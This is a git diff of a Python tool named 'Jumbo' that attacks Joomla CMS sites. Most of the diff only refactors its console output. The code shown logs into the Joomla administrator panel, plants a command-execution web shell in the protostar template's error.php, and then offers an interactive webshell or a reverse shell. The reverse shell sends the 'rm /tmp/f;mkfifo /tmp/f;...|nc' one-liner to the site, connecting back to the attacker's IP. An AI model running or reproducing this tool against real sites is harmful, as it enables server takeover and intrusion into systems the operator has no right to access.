@@ -2,24 +2,32 @@ import sys
 import requests
 import argparse
 from rich.console import Console
+from rich.text import Text
 from bs4 import BeautifulSoup
 console = Console()
 
 # State with colors
 # Todo : put this in POO class message.entry message.success etc.. for practice and good code
-def tool_entry():
-    return console.print("[u]Jumbo[/u] >", style="bold")
-def ongoing():
-    return console.print("[*]", style="bold blue")
+class message:
+    def tool_entry():
+        message = Text("[u]Jumbo[/u] >", style="bold")
+        return message
+    def ongoing():
+        message = Text("[*]", style="bold blue")
+        return message
 
-def success():
-    return console.print("[+]", style="bold green")
+    def success():
+        message = Text("[+]", style="bold green")
+        return message
 
-def failed():
-    return console.print("[-]", style="bold red")
+    def failed():
+        message = Text("[-]", style="bold red")
+        return message
 
-def warning():
-    return console.print("[!]", style="bold yellow")
+    def warning():
+        message = Text("[!]", style="bold yellow")
+        return message
+
 # WORDPRESS
 
 # JOOMLA
@@ -30,11 +38,11 @@ def get_hidden_values(url):
     try:
         response = requests.get(f"{url}/administrator/index.php")
     except requests.exceptions.MissingSchema:
-        print(f"{failed()} Please specify a correct ip")
-        print("Exit 🐘")
+        console.print(message.failed(), "Please specify a correct ip")
+        console.print("Exit 🐘")
         sys.exit(1)
     except TypeError:
-        print("The URL is None. Please provide a valid URL.")
+        console.print(message.failed(), "The URL is None. Please provide a valid URL.")
     
     if response.status_code == 200:
         soup = BeautifulSoup(response.content, 'html.parser')
@@ -78,9 +86,9 @@ def post_login_joomla(user, password, url, hidden_values):
 
     print(response.request)
     # Debug
-    print(f"{ongoing()} Start login into admin")
-    print(f'{ongoing()} {data}')
-    print(f'{success()} Status code: {response.status_code}')
+    console.print(f"{message.ongoing()} Start login into admin")
+    console.print(f'{message.ongoing()} {data}')
+    console.print(f'{message.success()} Status code: {response.status_code}')
     # Lunch
     put_exploit_joomla(url)
     
@@ -95,40 +103,40 @@ def put_exploit_joomla(url):
     }
     host = f"{url}/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA"
     response = requests.post(host, data, allow_redirects=True)
-    print(response.status_code)
+    console.print(response.status_code)
     
-    print(f"{ongoing()} Starting the exploit")
+    console.print(f"{message.ongoing()} Starting the exploit")
     host = f"{url}/templates/protostar/error.php/error.php?cmd="
-    print(host)
+    console.print(host)
     cmd_echo = f"{host}echo%20%27HelloWorld%27"
-    print(cmd_echo)
+    console.print(cmd_echo)
     response = requests.get(cmd_echo)
-    print(response.status_code)
-    print(response.content.decode('utf-8'))
+    console.print(response.status_code)
+    console.print(response.content.decode('utf-8'))
     
     if "HelloWorld" in response.content.decode('utf-8'):
-        print(f"{success()} Open input user, let's start hacking")
+        console.print(f"{message.success()} Open input user, let's start hacking")
 
         while True:
-            print("Which mode are you choosing ? [1]: Webshell, [2]: Reverseshell :")
+            console.print("Which mode are you choosing ? [1]: Webshell, [2]: Reverseshell :")
             user_choice = input()
 
             match user_choice:
                 case '1':
-                    print(f'{success()} Webshell')
+                    console.print(f'{message.success()} Webshell')
                     webshell_joomla(host)
                 case '2':
-                    print(f'{success()} Reverseshell')
+                    console.print(f'{message.success()} Reverseshell')
                     reverse_shell_joomla(host)
                 case _:
-                    print(f'{warning()} select a mode!')
+                    console.print(f'{message.warning()} select a mode!')
 
     else:
-        print(f"{failed()} Can't open a shell")
+        console.print(f"{message.failed()} Can't open a shell")
 
 
 def webshell_joomla(host):
-    print("Enter a (web)shell command (type 'exit' to return to select mode): ")
+    console.print("Enter a (web)shell command (type 'exit' to return to select mode): ")
     while True:
         user_cmd = input()
 
@@ -139,23 +147,23 @@ def webshell_joomla(host):
         response = requests.get(new_url)
 
         if response.content.decode('utf-8').strip():
-            print(response.content.decode('utf-8').rstrip())
+            console.print(response.content.decode('utf-8').rstrip())
 
 
 def reverse_shell_joomla(host):
-    print("Enter the selected port: ")
+    console.print("Enter the selected port: ")
     user_port = input()
-    print(f"Lunch your netcat: nc -lvnp {user_port}")
+    console.print(f"Lunch your netcat: nc -lvnp {user_port}")
 
-    print("Enter your ip: ")
+    console.print("Enter your ip: ")
     user_ip = input()
 
     reverse_shell_cmd = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {user_ip} {user_port} >/tmp/f"
 
     new_url = f"{host}{reverse_shell_cmd}"
-    print(f"{success()} Your ip: {user_ip}")
-    print(f"{success()} Your port: {user_port}")
-    print(f"{success()} Launching the reverse shell")
+    console.print(f"{message.success()} Your ip: {user_ip}")
+    console.print(f"{message.success()} Your port: {user_port}")
+    console.print(f"{message.success()} Launching the reverse shell")
     requests.get(new_url)
 
     # Todo : look to use the multi/handler from msf directly within the tool ?
@@ -177,9 +185,9 @@ def main():
 
     if args.mode:
         if args.mode == 'wordpress':
-            print(f'{success()} Mode: wordpress')
+            console.print(message.success(), 'Mode: wordpress')
         elif args.mode == 'joomla':
-            print(f'{success()} Mode: joomla')
+            console.print(message.success(), 'Mode: joomla')
             hidden_values = get_hidden_values(args.host)
             post_login_joomla(args.username, args.password, args.host, hidden_values)
     else:
